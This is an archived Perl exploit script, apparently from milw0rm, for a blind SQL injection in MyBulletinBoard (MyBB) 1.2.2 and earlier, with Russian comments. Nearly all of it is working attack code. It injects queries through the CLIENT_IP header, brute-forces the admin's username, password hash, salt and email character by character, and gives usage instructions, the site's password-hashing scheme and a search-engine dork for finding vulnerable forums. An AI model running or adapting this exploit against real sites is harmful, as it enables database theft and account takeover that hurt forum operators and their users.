<html><head><title>MyBulletinBoard (MyBB) <= 1.2.2 (CLIENT-IP) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
###########################################################
#########################  LOGO  ##########################
###########################################################
#     Mybb &lt;= 1.2.2 Remote SQL Injecton Exploit v.2.0     #
#                                                         #
#       [u]used:   SQL CLIENT_IP vulnerability            #
#       [!]need:   Mysql &gt;= 4.1                           #
#       [w]work:   blind sql-inj                          #
#       [g]google: Powered By MyBB                        #
#                                                         #
#               coded by Elekt (antichat.ru)              #
###########################################################
#######################  Coments  #########################
###########################################################
#
# Описание:
# Работа эксплойта основана на sql-инъекции в HTTP_CLIENT_IP.
# Неавторизованный пользователь может выполнить произвольный SQL-запрос в базу.
#
# http://host.com/mybb/index.php
# MySQL error: 1064
# You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;&gt;'' at line 3
# Query: DELETE FROM mybb_sessions WHERE ip=''&quot;&gt;'
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Это новая версия эксплойта. 
# Мной был найден способ отказаться от использования benchmark,
# что позволяет ускорить работу эксплойта, повысить надежность полученных данных.
# 
# Работа эксплойта основана на провоцировании &quot;Subquery returns more than 1 row&quot; ошибки,
# что позволяет произвести blind-sql-inj: 
# 
# mybb
# match: &quot;Subquery returns more than 1 row&quot;
# CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))&gt;1,password,uid))&lt;5)/*
# CLIENT_IP: 123' or 1=(select null from mybb_users where length(if(ascii(substring((select password from mybb_users where uid=1),1,1))&gt;254,password,uid))&lt;5)/*
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# 
# Полезные таблицы и поля:
# mybb_1.2.1: mybb_users - uid,username,password,salt,email,loginkey,icq,aim,regip
# 
# Алгоритм генерации паролей в mybb:
# md5(md5($salt).md5($password))
# generate_salt{return random_str(8);}
# 
###########################################################
#########################  init  ###########################
###########################################################

use LWP::UserAgent; 
$sock = LWP::UserAgent-&gt;new();

$|=1;

&amp;header();


###########################################################
#######################  Options  #########################
###########################################################

if (@ARGV &lt; 2) {&amp;info(); exit();}

$host = $ARGV[0]; # сервак
$dir = $ARGV[1];  # дира с форумом
$uid = 2;         # акк админа по дефаулту
$uid = $ARGV[2] if $ARGV[2];

$debug = 0;            # режим отладки
$space = &quot;char(58)&quot;;   # разделитель столбцов
#$search = &quot;password&quot;;  # что брутим, собственно...
#$search = &quot;concat(uid,$space,password,$space,salt)&quot;; # uid:password:salt
$search = &quot;concat(uid,$space,username,$space,password,$space,salt,$space,email)&quot;; # uid:username:password:salt:email
$search = $ARGV[3] if $ARGV[3];

# $presetascii - диапазон ascii-кодов для брута вероятных данных
# $presetascii = &quot;0123456789abcdef&quot;;
# $presetascii = &quot;0123456789&quot;
# $presetascii = &quot;abcdefghijklmnopqrstuvwxyz&quot;
# $presetascii = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;
# $presetascii = &quot;абвгдеёжзийклмнопрстуфхцчшщъыьэюя&quot;);
# цикл, для простоты задаёт все символы для перебора 
$i=0;
while($i&lt;=255){
$presetascii.=chr($i);$i++;
}

###########################################################
#########################  go!  ###########################
###########################################################


$time=localtime;
&amp;log (&quot;[i] Start time  $time\n&quot;);
&amp;log (&quot;[+] HOST \&quot;$host\&quot;\n&quot;);
&amp;log (&quot;[+] DIR  \&quot;$dir\&quot;\n&quot;);
&amp;log (&quot;[+] UID  \&quot;$uid\&quot;\n&quot;);
&amp;log (&quot;[+] Search  \&quot;$search\&quot;\n&quot;);

###########################################################
###### detecting vulnerability and searching prefix #######
###########################################################

# detecting vulnerability and searching prefix
&amp;log (&quot;[~] Testing forum vulnerabile... &quot;);
$q = &quot;&quot;;
$prefix=query($q,$host,$dir);
if($prefix ne &quot;not_find&quot;){&amp;log (&quot;Yes! Forum vulnerable!\n&quot;);sleep(1);&amp;log (&quot;[~] Searching prefix...&quot;);sleep(1);&amp;log (&quot; prefix find - \&quot;$prefix\&quot;\n&quot;); }
else 
    {
     &amp;log (&quot;Sorry. Forum unvulnerable\n&quot;);
	 &amp;footer();
     exit();
    }


###########################################################
#####################   brutforce   #######################
###########################################################

# brutforce
&amp;log (&quot;[~] Brutforce begin! it may take some time, plz, wait...\n&quot;);
$kol=1;
for ($control=0;$control==0;){
   &amp;log(&quot;\n---------------- Simvol $kol ----------------\n\n&quot;) if $debug;
   $amin = 1;
   $amax = length($presetascii)-1;
   $n=0;

   # если диапазон 4 и более символов, переопределяем диапазон, уменьшая его в 2 раза
   while (($amax-$amin)&gt;=4){
        print (&quot;-&gt; Try &quot;.ord(substr($presetascii,$amin,1)).&quot; .. &quot;.ord(substr($presetascii,$amax,1)).&quot; -&gt; &quot;) if $debug;;
	#$q = &quot;or 1=if((ascii(substring((select &quot;.$search.&quot; from &quot;.$prefix.&quot;users where uid='&quot;.$uid.&quot;'),&quot;.$kol.&quot;,1))&gt;=&quot;.ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).&quot;),1,benchmark(&quot;.$benchmark.&quot;,md5(char(114,115,116))))/*&quot;;
	$q = &quot;or 1=(select null from &quot;.$prefix.&quot;users where length(if((ascii(substring((select &quot;.$search.&quot; from &quot;.$prefix.&quot;users where uid='&quot;.$uid.&quot;'),&quot;.$kol.&quot;,1))&gt;=&quot;.ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).&quot;),password,uid))&lt;5)/*&quot;;
        if (query($q,$host,$dir) eq &quot;not_find&quot;) { 
          print (&quot;Char&gt;=&quot;.ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).&quot;\n&quot;) if $debug;;
          $amin=int($amax-($amax-$amin)/2); }
        else { 
          print (&quot;Char&lt;&quot;.ord(substr($presetascii,int($amax-($amax-$amin)/2),1)).&quot;\n&quot;) if $debug;;
          $amax=int($amax-($amax-$amin)/2); };
   }
   
   # если диапазон менее 4-х символов, то переходим к перебору
   while ($amin&lt;=$amax) {
     print (&quot;-&gt; Try &quot;.ord(substr($presetascii,$amin,1)).&quot; -&gt;&quot;) if $debug;;
     # проверяем ответ скрипта, если ответ положительный то выводим символ и ищем следующий символ в слове, если не определяем символ - выход.
	#$q = &quot;or 1=if((ascii(substring((select &quot;.$search.&quot; from &quot;.$prefix.&quot;users where uid='&quot;.$uid.&quot;'),&quot;.$kol.&quot;,1))=&quot;.ord(substr($presetascii,$amin,1)).&quot;),1,benchmark(&quot;.$benchmark.&quot;,md5(char(114,115,116))))/*&quot;;
	$q = &quot;or 1=(select null from &quot;.$prefix.&quot;users where length(if((ascii(substring((select &quot;.$search.&quot; from &quot;.$prefix.&quot;users where uid='&quot;.$uid.&quot;'),&quot;.$kol.&quot;,1))=&quot;.ord(substr($presetascii,$amin,1)).&quot;),password,uid))&lt;5)/*&quot;;
     if (query($q,$host,$dir) eq &quot;not_find&quot;) {
          &amp;log (&quot; FOUND!\n-&gt; Ascii: &quot;.ord(substr($presetascii,$amin,1)).&quot;\n-&gt; Char: \&quot;&quot;.substr($presetascii,$amin,1).&quot;\&quot;\n&quot;) if $debug;; 
          &amp;log (&quot;[$kol] Find - ascii:\&quot;&quot;.ord(substr($presetascii,$amin,1)).&quot;\&quot;, char:\&quot;&quot;.substr($presetascii,$amin,1).&quot;\&quot;\n&quot;) if !$debug;
          $rezultat_char = $rezultat_char.substr($presetascii,$amin,1); 
          $rezultat_ascii = $rezultat_ascii.ord(substr($presetascii,$amin,1)).&quot;,&quot;; 
          $amin=$amax+1;$control=1;}
        else { print (&quot; NO =(\n&quot;) if $debug; $amin=$amin+1; };
   }
   if ($control==0) { 
     if($amin!=5){$rezultat_char = $rezultat_char.&quot;?&quot;;$rezultat_ascii = $rezultat_ascii.&quot;?,&quot;;
                  &amp;log (&quot;[$kol] Error! not found =( $amin\n&quot;) if !$debug;
                  &amp;log (&quot; Error! not found =(\n&quot;) if $debug;
     }else{$control=1;}
   }else {$control=0;}
   $kol++;
}

print (&quot;\n[!] Yyyy-a-a-a-h-h-uuu!!!\n&quot;);
&amp;log (&quot;\n[*] Char: $rezultat_char\n[*] Ascii: $rezultat_ascii\n&quot;);
$time=localtime;
&amp;log (&quot;\n[i] Finish time  $time\n\n&quot;);


&amp;footer();
exit();

###########################################################
########################  log   ##########################
###########################################################
# лог
sub log($)
    {
     open(RES,&quot;&gt;&gt;&quot;.$host.&quot;_log.txt&quot;) || die &quot;[-] Cannot open log file!&quot;; ## Открываем лог для дозаписи
     print (&quot;$_[0]&quot;);
     print RES (&quot;$_[0]&quot;);
     close(RES);
    }

###########################################################
######################## footer  ##########################
###########################################################
# эпилог
sub footer()
    {
     print (&quot;[G] Greets: Elekt (antichat.ru), 1dt.w0lf (rst/ghc)\n&quot;);
     print (&quot;[L] Visit : www.antichat.ru\n&quot;);
    }


###########################################################
######################## header  ##########################
###########################################################
# хидер
sub header()
{
print q(
=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=
+     Mybb &lt;= 1.2.2 Remote SQL Injecton Exploit v.2.0     +
+                                                         +
+       [i]used:   SQL CLIENT_IP vulnerability            +
+       [!]need:   Mysql &gt;= 4.1                           +
+       [w]work:   blind sql-inj                          +
+       [i]google: Powered By MyBB                        +
+                                                         +
+               coded by Elekt (antichat.ru)              +
=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=_+
);
}


###########################################################
########################  info   ##########################
###########################################################
# инфо
sub info()
{
 print q(
[i] Usage: 
 perl mybb122exp.pl [host] [/dir/] [uid] [search]
*-required
  *[host] - target host without http://
  *[/dir/] - installed forums dir
   [uid] - user uid (default=2)
   [search] - data (uid:username:password:salt:email)
	   
[E] Example: perl mybb122exp.pl host.com /forum/ 1 password

[i] mybb: md5(md5($salt).md5($password))

 );
}

###########################################################
#######################  sender   #########################
###########################################################
# процедура приема\посылки данных
sub query()
    {
     #&amp;log (&quot;\n\n$q\n\n&quot;) if $debug;
     my($q,$host,$dir) = @_;
     $res = $sock-&gt;get(&quot;http://&quot;.$host.$dir.&quot;index.php&quot;,'USER_AGENT'=&gt;'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)','CLIENT_IP'=&gt;&quot;' &quot;.$q); 
     if($res-&gt;is_success)
        {
             if($res-&gt;as_string =~ /FROM (.*)sessions/) { return $1; } else {return &quot;not_find&quot;;}
        }
     else{&amp;log (&quot;\n[!] Connection to $host FAILED! EXIT\n&quot;); exit;}
    }

# milw0rm.com [2007-04-12]</pre></html>